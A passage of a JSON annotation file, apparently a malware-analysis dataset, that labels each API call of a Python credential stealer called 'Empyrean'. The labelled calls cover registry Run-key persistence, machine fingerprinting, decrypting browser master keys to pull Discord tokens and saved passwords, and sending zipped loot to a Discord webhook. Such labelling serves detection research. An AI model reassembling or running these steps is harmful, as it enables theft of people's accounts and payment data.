              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "self.working_dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Ensure_directory_exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "self.working_dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Delete_directory_content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "os.path.realpath(sys.executable), self.working_dir + \"\\dat.txt\"",
              "object_description": "Executable_startup_path",
              "object_id": "executable_startup_path",
              "intention_description": "Copy_file_startup_directory",
              "intention_id": "copy_file_startup_directory"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"{self.working_dir}\\run.bat\", mode=\"w\"",
              "object_description": "Batch_file_path",
              "object_id": "batch_file_path",
              "intention_description": "Write_file_content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "subprocess.run()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "[\"reg\", \"delete\", \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"/v\", \"empyrean\", \"/f\"], shell=True",
              "object_description": "Shell_command",
              "object_id": "shell_command",
              "intention_description": "Delete_startup_registry_entry",
              "intention_id": "delete_startup_registry_entry"
            },
            {
              "action_api": "subprocess.run()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "[\"reg\", \"add\", \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"/v\", \"empyrean\", \"/t\", \"REG_SZ\", \"/d\", f\"{self.working_dir}\\run.bat\", \"/f\"], shell=True",
              "object_description": "Shell_command",
              "object_id": "shell_command",
              "intention_description": "Add_startup_registry_entry",
              "intention_id": "add_startup_registry_entry"
            },
            {
              "action_api": "psutil.process_iter()",
              "action_description": "Iterates over all running processes",
              "action_id": "iterate_processes",
              "object": "",
              "object_description": "System_process",
              "object_id": "system_process",
              "intention_description": "List_processes",
              "intention_id": "list_processes"
            },
            {
              "action_api": "proc.name()",
              "action_description": "Retrieves process name",
              "action_id": "get_process_name",
              "object": "proc",
              "object_description": "System_process",
              "object_id": "system_process",
              "intention_description": "Collect_process_name",
              "intention_id": "collect_process_name"
            },
            {
              "action_api": "proc.kill()",
              "action_description": "Terminates the process",
              "action_id": "terminate_process",
              "object": "proc",
              "object_description": "System_process",
              "object_id": "system_process",
              "intention_description": "Terminate_process",
              "intention_id": "terminate_process"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "'https://ipapi.co/ip/'",
              "object_description": "External_domain",
              "object_id": "external_domain",
              "intention_description": "Collect_public_ip",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "uuid.getnode()",
              "action_description": "Retrieves hardware address as 48-bit integer",
              "action_id": "get_hardware_address",
              "object": "",
              "object_description": "Hardware_address",
              "object_id": "",
              "intention_description": "Extract_mac_address",
              "intention_id": "extract_mac_address"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "'..', '%012x' % uuid.getnode()",
              "object_description": "Character_code_array",
              "object_id": "character_code_array",
              "intention_description": "Prepare_character_processing",
              "intention_id": "prepare_character_processing"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE",
              "object_description": "Shell_command",
              "object_id": "shell_command",
              "intention_description": "Get_hardware_uuid",
              "intention_id": "get_hardware_uuid"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"UserName\"",
              "object_description": "Environment_variable",
              "object_id": "environment_variable",
              "intention_description": "Collect_current_username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"COMPUTERNAME\"",
              "object_description": "Environment_variable",
              "object_id": "environment_variable",
              "intention_description": "Collect_system_hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "SyncWebhook.from_url()",
              "action_description": "Creates Discord webhook object",
              "action_id": "create_discord_webhook",
              "object": "webhook",
              "object_description": "Discord_webhook_url",
              "object_id": "discord_webhook_url",
              "intention_description": "Webhook_transmission_preparation",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "Embed()",
              "action_description": "Creates Discord embed object",
              "action_id": "create_discord_embed",
              "object": "title=\"System Information\", color=0x000000",
              "object_description": "Serialized_embed_object",
              "object_id": "serialized_embed_object",
              "intention_description": "Serialize_data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "embed.add_field()",
              "action_description": "Adds field to Discord embed",
              "action_id": "add_discord_embed_field",
              "object": "name, value, inline",
              "object_description": "Serialized_embed_object",
              "object_id": "serialized_embed_object",
              "intention_description": "Serialize_data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "ImageGrab.grab()",
              "action_description": "Captures screenshot of screen",
              "action_id": "capture_screen_region",
              "object": "bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None",
              "object_description": "Screen_region",
              "object_id": "screen_region",
              "intention_description": "Capture_screenshot",
              "intention_id": "capture_screenshot"
            },
            {
              "action_api": "image.save()",
              "action_description": "Saves image to file",
              "action_id": "save_image_file",
              "object": "\"screenshot.png\"",
              "object_description": "Image_file",
              "object_id": "image_file",
              "intention_description": "Save_screenshot_file",
              "intention_id": "save_screenshot_file"
            },
            {
              "action_api": "embed.set_image()",
              "action_description": "Sets thumbnail image for Discord embed",
              "action_id": "set_discord_thumbnail",
              "object": "url=\"attachment://screenshot.png\"",
              "object_description": "Script_path_with_image",
              "object_id": "script_path_with_image",
              "intention_description": "Serialize_data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "File()",
              "action_description": "Create Discord file object",
              "action_id": "create_discord_file",
              "object": "'.\\screenshot.png', filename='screenshot.png'",
              "object_description": "Image_file",
              "object_id": "image_file",
              "intention_description": "Send_screenshot_server",
              "intention_id": "send_screenshot_server"
            },
            {
              "action_api": "webhook.send()",
              "action_description": "Sends message to Discord channel via webhook",
              "action_id": "send_discord_webhook",
              "object": "embed=embed, file=File('.\\screenshot.png', filename='screenshot.png'), username=\"Empyrean\", avatar_url=\"https://i.imgur.com/HjzfjfR.png\"",
              "object_description": "Discord_webhook_url",
              "object_id": "discord_webhook_url",
              "intention_description": "Send_screenshot_server",
              "intention_id": "send_screenshot_server"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "\"screenshot.png\"",
              "object_description": "Image_file",
              "object_id": "image_file",
              "intention_description": "Determine_file_presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "\"screenshot.png\"",
              "object_description": "Image_file",
              "object_id": "image_file",
              "intention_description": "Delete_file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"localappdata\"",
              "object_description": "Environment_variable",
              "object_id": "environment_variable",
              "intention_description": "Collect_environment_variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"appdata\"",
              "object_description": "Environment_variable",
              "object_id": "environment_variable",
              "intention_description": "Collect_environment_variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.regexp_enc, line",
              "object_description": "Regex_file_content",
              "object_id": "regex_file_content",
              "intention_description": "Decode_obfuscated_data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "y.split(\"dQw4w9WgXcQ:\")[1]",
              "object_description": "Base64_encoded_string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode_base64_data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "self.decrypt_val()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "base64.b64decode(...), self.get_master_key(...)",
              "object_description": "Decompressed_data_with_key",
              "object_id": "decompressed_data_with_key",
              "intention_description": "Decrypt_encrypted_data",
              "intention_id": "decrypt_encrypted_data"
            },
            {
              "action_api": "self.get_master_key()",
              "action_description": "Retrieves and decrypts master key from local state",
              "action_id": "get_master_key",
              "object": "self.roaming + f\"\\{_discord}\\Local State\"",
              "object_description": "Chrome_local_state_file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Decrypt_browser_master_key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "self.validate_token()",
              "action_description": "Checks validity of Discord token",
              "action_id": "check_discord_token",
              "object": "token",
              "object_description": "Account_credentials",
              "object_id": "account_credentials",
              "intention_description": "Determine_valid_authentication_presence",
              "intention_id": "determine_valid_authentication_presence"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.base_url, headers={\"Authorization\": token}",
              "object_description": "Discord_api_endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Access_remote_data",
              "intention_id": "access_remote_data"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "self.roaming + \"\\Mozilla\\Firefox\\Profiles\"",
              "object_description": "Browser_profile_directory",
              "object_id": "browser_profile_directory",
              "intention_description": "Determine_directory_presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Directory tree generation",
              "action_id": "path_special_operations",
              "object": "self.roaming + \"\\Mozilla\\Firefox\\Profiles\"",
              "object_description": "Browser_profile_directory",
              "object_id": "browser_profile_directory",
              "intention_description": "List_firefox_profile_files",
              "intention_id": "list_firefox_profile_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f\"{path}\\{_file}\", errors=\"ignore\"",
              "object_description": "Local_file",
              "object_id": "local_file",
              "intention_description": "Read_file_content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.regexp, line",
              "object_description": "Regex_file_content",
              "object_id": "regex_file_content",
              "intention_description": "Decode_obfuscated_data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.base_url, headers={\"Authorization\": token}",
              "object_description": "Discord_api_endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Access_remote_data",
              "intention_id": "access_remote_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "\"https://discord.com/api/v8/users/@me\", headers={\"Authorization\": token}",
              "object_description": "Discord_api_endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Access_remote_data",
              "intention_id": "access_remote_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "\"https://discord.com/api/v6/users/@me/billing/payment-sources\", headers={\"Authorization\": token}",
              "object_description": "Discord_api_endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Access_remote_data",
              "intention_id": "access_remote_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "\"https://discord.com/api/v9/users/@me/guilds?with_counts=true\", headers={\"Authorization\": token}",
              "object_description": "Discord_api_endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Access_remote_data",
              "intention_id": "access_remote_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "\"https://discord.com/api/v8/users/@me/relationships\", headers={\"Authorization\": token}",
              "object_description": "Discord_api_endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Access_remote_data",
              "intention_id": "access_remote_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "\"https://discord.com/api/v9/users/@me/outbound-promotions/codes\", headers={\"Authorization\": token}",
              "object_description": "Discord_api_endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Access_remote_data",
              "intention_id": "access_remote_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "f\"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif\"",
              "object_description": "Discord_cdn_url",
              "object_id": "discord_cdn_url",
              "intention_description": "Download_remote_content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "f\"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png\"",
              "object_description": "Discord_cdn_url",
              "object_id": "discord_cdn_url",
              "intention_description": "Download_remote_content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "Embed()",
              "action_description": "Creates Discord embed object",
              "action_id": "create_discord_embed",
              "object": "title=f\"{username} ({user_id})\", color=0x000000",
              "object_description": "Serialized_embed_object",
              "object_id": "serialized_embed_object",
              "intention_description": "Serialize_data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "embed.set_thumbnail()",
              "action_description": "Sets thumbnail image for Discord embed",
              "action_id": "set_discord_thumbnail",
              "object": "url=avatar",
              "object_description": "Discord_cdn_url",
              "object_id": "discord_cdn_url",
              "intention_description": "Serialize_data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "self.webhook.send()",
              "action_description": "Sends message to Discord channel via webhook",
              "action_id": "send_discord_webhook",
              "object": "embed=embed, username=\"Empyrean\", avatar_url=\"https://i.imgur.com/HjzfjfR.png\"",
              "object_description": "Discord_webhook_url",
              "object_id": "discord_webhook_url",
              "intention_description": "Send_discord_tokens_server",
              "intention_id": "send_discord_tokens_server"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "\"vault\", exist_ok=True",
              "object_description": "Custom_directory",
              "object_id": "custom_directory",
              "intention_description": "Ensure_directory_exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"vault\\logins.txt\", \"w\", encoding=\"utf-8\"",
              "object_description": "Local_file",
              "object_id": "local_file",
              "intention_description": "Write_file_content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"vault\\cookies.txt\", \"w\", encoding=\"utf-8\"",
              "object_description": "Local_file",
              "object_id": "local_file",
              "intention_description": "Write_file_content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"vault\\web_history.txt\", \"w\", encoding=\"utf-8\"",
              "object_description": "Local_file",
              "object_id": "local_file",
              "intention_description": "Write_file_content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"vault\\downloads.txt\", \"w\", encoding=\"utf-8\"",
              "object_description": "Local_file",
              "object_id": "local_file",
              "intention_description": "Write_file_content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"vault\\cards.txt\", \"w\", encoding=\"utf-8\"",
              "object_description": "Local_file",
              "object_id": "local_file",
              "intention_description": "Write_file_content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "ZipFile()",
              "action_description": "Creates new ZIP archive for writing",
              "action_id": "create_zip_archive",
              "object": "\"vault.zip\", \"w\"",
              "object_description": "Zip_archive",
              "object_id": "zip_archive",
              "intention_description": "Create_zip_archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "zip.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "f\"vault\\{file}\", file",
              "object_description": "Local_file",
              "object_id": "local_file",
              "intention_description": "Add_file_to_archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "self.webhook.send()",
              "action_description": "Sends message to Discord channel via webhook",
              "action_id": "send_discord_webhook",
              "object": "embed=Embed(...), file=File(\"vault.zip\"), username=\"Empyrean\", avatar_url=\"https://i.imgur.com/HjzfjfR.png\"",
              "object_description": "Discord_webhook_url",
              "object_id": "discord_webhook_url",
              "intention_description": "Send_file_data_server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "\"vault\"",
              "object_description": "Custom_directory",
              "object_id": "custom_directory",
              "intention_description": "Delete_directory_content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "\"vault.zip\"",
              "object_description": "Zip_archive",
              "object_id": "zip_archive",
              "intention_description": "Delete_file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'LOCALAPPDATA'",
              "object_description": "Environment_variable",
              "object_id": "environment_variable",
              "intention_description": "Collect_environment_variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Custom_directory",
              "object_id": "custom_directory",
              "intention_description": "Determine_directory_presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "self.get_master_key()",
              "action_description": "Retrieves and decrypts master key from local state",
              "action_id": "get_master_key",
              "object": "f'{path}\\Local State'",
              "object_description": "Chrome_local_state_file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Decrypt_browser_master_key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path + '\\' + profile",
              "object_description": "Browser_profile_directory",
              "object_id": "browser_profile_directory",
              "intention_description": "Determine_directory_presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "shutil.copy()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "login_db, 'login_db'",
              "object_description": "Local_file",
              "object_id": "local_file",
              "intention_description": "Copy_database_temp_location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "'login_db'",
              "object_description": "Local_file",
              "object_id": "local_file",
              "intention_description": "Open_sqlite_database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create_database_cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "'SELECT action_url, username_value, password_value FROM logins'",
              "object_description": "Sql_query_string",
              "object_id": "sql_query_string",
              "intention_description": "Query_browser_passwords",
              "intention_id": "query_browser_passwords"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract_browser_password_data",
              "intention_id": "extract_browser_password_data"
            },
            {
              "action_api": "self.decrypt_password()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "row[2], self.master_key",
              "object_description": "Decompressed_data_with_key",
              "object_id": "decompressed_data_with_key",
              "intention_description": "Decrypt_browser_password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close_database_connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "'login_db'",
              "object_description": "Local_file",
              "object_id": "local_file",
              "intention_description": "Delete_temporary_database",
              "intention_id": "delete_temporary_database"
            }
          ]
        }
      ]
    }
  ]
}